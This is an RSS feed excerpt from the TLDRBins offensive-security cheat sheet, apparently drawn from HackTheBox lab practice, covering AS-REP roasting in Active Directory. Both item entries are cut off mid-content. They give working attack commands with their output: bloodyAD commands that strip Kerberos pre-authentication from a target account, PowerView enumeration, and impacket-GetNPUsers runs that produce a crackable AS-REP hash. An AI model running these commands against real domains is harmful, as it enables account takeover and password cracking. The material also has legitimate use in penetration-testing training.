channel.title: Asreproast on TLDRBins
channel.description: Recent content in Asreproast on TLDRBins

item.title: GenericWrite
item.description: Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to Target User Linux Windows 1. Enable Account [Optional] sudo ntpdate -s <DC_IP> && bloodyAD --host <DC> -d "<DOMAIN>" --dc-ip <DC_IP> -k remove uac <TARGET_USER> -f ACCOUNTDISABLE 2. Add UF_DONT_REQUIRE_PREAUTH bit sudo ntpdate -s <DC_IP> && bloodyAD --host <DC> -d "<DOMAIN>" --dc-ip <DC_IP> -k add uac <TARGET_USER> -f DONT_REQ_PREAUTH 1. Import PowerView . .\PowerView.ps1 PS C:\programdata> . .\PowerView.ps1 . .\PowerView.ps1 2. Check Target User Get-DomainUser '<TARGET_USER>' | ConvertFrom-UACValue PS C:\programdata> Get-DomainUser 'user' | ConvertFrom-UACValue Get-DomainUser 'user' | ConvertFrom-UACValue Name Value ---- ----- NORMAL_ACCOUNT 512 3.

item.title: Kerberoasting
item.description: AS_REP Roasting Impacket nxc # Multiple valid usernames impacket-GetNPUsers <DOMAIN>/ -usersfile <USERS_FILE> -no-pass -dc-ip <DC_IP> $ impacket-GetNPUsers ABSOLUTE.HTB/ -usersfile valid_usernames.txt -no-pass -dc-ip DC.ABSOLUTE.HTB Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies [-] User j.roberts doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User m.chaffrey doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User s.osvald doesn't have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$d.klay@ABSOLUTE.HTB:85554d22d5c220d8a757ce9913d207ea$7288c91ca ---[SNIP]--- 0e09c5d9d1 [-] User j.robinson doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User n.smith doesn't have UF_DONT_REQUIRE_PREAUTH set # Single user without creds impacket-GetNPUsers -no-pass -dc-ip <DC_IP> '<DOMAIN>/<USER>' $ impacket-GetNPUsers -no-pass -dc-ip 10.
